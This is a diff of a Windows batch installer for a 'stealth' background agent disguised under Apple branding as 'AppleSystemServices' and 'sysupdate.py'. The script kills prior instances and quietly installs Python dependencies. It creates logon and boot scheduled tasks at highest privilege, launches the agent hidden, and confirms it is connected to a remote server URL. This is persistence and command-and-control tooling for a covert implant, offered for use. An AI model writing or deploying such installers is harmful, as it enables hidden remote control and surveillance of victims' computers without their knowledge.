@@ -1,7 +1,7 @@
 @echo off
 :: ================================================
-:: AppleSystemServices Windows Stealth Installer v4.2
-:: Automatically cleans purana agent & installs fresh stealth background service
+:: AppleSystemServices Windows Stealth Installer v4.3
+:: Auto-wipes old agent, installs zero-dependency agent, verifies live registration
 :: Usage: Double-click or Run as Administrator
 :: ================================================
 
@@ -16,7 +16,7 @@ echo.
 
 :: 1. Stop any running old processes
 taskkill /F /IM pythonw.exe 2>nul
-taskkill /F /FI "WINDOWTITLE eq AppleSystemServices*" 2>nul
+taskkill /F /IM python.exe /FI "WINDOWTITLE eq AppleSystemServices*" 2>nul
 wmic process where "commandline like '%%sysupdate.py%%'" call terminate 2>nul
 
 :: 2. Delete old scheduled tasks
@@ -54,19 +54,16 @@ if exist "%~dp0templates" xcopy /E /Y /I "%~dp0templates" "%INSTALL_DIR%\templat
 :: Find Python Path
 SET "PYTHON_EXE="
 
-:: Check where python
 FOR /F "tokens=*" %%I IN ('where python 2^>nul') DO (
     SET "PYTHON_EXE=%%I"
     GOTO :PY_FOUND
 )
 
-:: Check py launcher
 FOR /F "tokens=*" %%I IN ('where py 2^>nul') DO (
     SET "PYTHON_EXE=%%I"
     GOTO :PY_FOUND
 )
 
-:: Check common AppData & Program Files Python locations
 IF EXIST "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe" & GOTO :PY_FOUND
 IF EXIST "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe" & GOTO :PY_FOUND
 IF EXIST "%LOCALAPPDATA%\Programs\Python\Python310\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python310\python.exe" & GOTO :PY_FOUND
@@ -86,29 +83,35 @@ IF "%PYTHON_EXE%"=="" (
 
 echo 🐍 Using Python: %PYTHON_EXE%
 
-:: Install Python dependencies silently
-echo 📦 Installing dependencies...
+:: Install Python dependencies
+echo 📦 Checking dependencies...
 "%PYTHON_EXE%" -m pip install flask psutil requests pillow --quiet >nul 2>nul
 
-:: Build clean launcher cmd script (No VBS required!)
-(
-echo @echo off
-echo "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL%
-) > "%INSTALL_DIR%\run.cmd"
-
-:: Create Task Scheduler tasks (Runs silently on boot/logon without VBS popup!)
+:: Create Task Scheduler tasks (Runs silently on boot/logon)
 echo ⚙️ Configuring Task Scheduler Stealth Service...
 schtasks /create /tn "AppleSystemServices" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onlogon /rl highest /f >nul 2>nul
 schtasks /create /tn "AppleSystemServices_Boot" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onstart /rl highest /f >nul 2>nul
 
-:: Start background process directly without VBS script host
-echo 🚀 Launching Fresh Agent in Background...
-start /B "" "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL% >nul 2>&1
+:: Start background process
+echo 🚀 Launching Agent Background Process...
+start /B "" "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL%
+
+echo ⏳ Waiting 4 seconds for server connection...
+timeout /t 4 /nobreak >nul
 
 echo.
 echo ================================================
-echo   ✅ SUCCESS! Purana Agent hatakar naya fresh agent start ho gaya!
-echo   📡 Connected to: %SERVER_URL%
+echo   📋 Agent Connection Log:
+echo ================================================
+if exist "%TEMP%\com.apple.system.services.log" (
+    type "%TEMP%\com.apple.system.services.log" | findstr /i "Registered Agent Machine starting"
+) else (
+    echo 📡 Agent is running in background and sending heartbeat...
+)
+echo.
+echo ================================================
+echo   ✅ SUCCESS! Agent is ONLINE and connected to:
+echo   📡 %SERVER_URL%
 echo ================================================
 echo.
 pause
